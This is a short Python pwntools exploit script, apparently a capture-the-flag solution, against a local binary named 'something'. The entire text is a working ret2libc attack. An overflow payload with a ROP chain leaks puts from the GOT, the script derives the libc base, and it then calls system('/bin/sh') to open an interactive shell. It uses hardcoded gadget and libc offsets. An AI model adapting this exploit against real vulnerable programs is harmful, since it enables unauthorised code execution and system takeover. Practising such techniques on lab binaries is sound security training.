sys_off = 336576 		# 0x7ffff7e122c0 - 0x7ffff7dc0000 = 	p system
offset = 541776			# 0x7ffff7e44450 - 0x7ffff7dc0000 = 	p puts
bin_off = 1787325	 	# 0x7ffff7f745bd - 0x7ffff7dc0000 = 	find 0x7ffff7dc0000, 0x7ffff7fae000, "/bin/sh"

from pwn import *
p = process('./something')
elf = ELF('./something')
# server - sau khi leak duoc puts_addr dung libc-search tra xem thu vien su dung la gi ?
# gdb.attach(p)

'''
ROPgadget --binary something | grep -E "pop rdi ; ret"         
0x00000000004012a3 : pop rdi ; ret

ROPgadget --binary something | grep -E "ret"
0x000000000040101a : ret
'''

puts_got = 0x404018
puts_plt = 0x401070 
main_addr = 0x40120e
prdi = 0x4012a3
ret = 0x40101a

# turn1---------------------------------------#

payload = "A" * 0x28
payload += p64(prdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr) 

p.recvuntil("Say something : ")
p.sendline(payload)

leak = p.recv(8)

puts_got = hex(u64(leak))
puts_got = puts_got[6:]
puts_got = int(puts_got, 16)

print("puts >> " + hex(puts_got))

# turn2---------------------------------------#

libc = puts_got - offset
system = libc + sys_off
binsh = libc + bin_off

print("libc >> " + hex(libc))
print("system >> " + hex(system))
print("binsh >> " + hex(binsh))

payload = "A" * 0x28
payload += p64(prdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

p.recvuntil("Say something : ")
p.sendline(payload)

p.interactive()

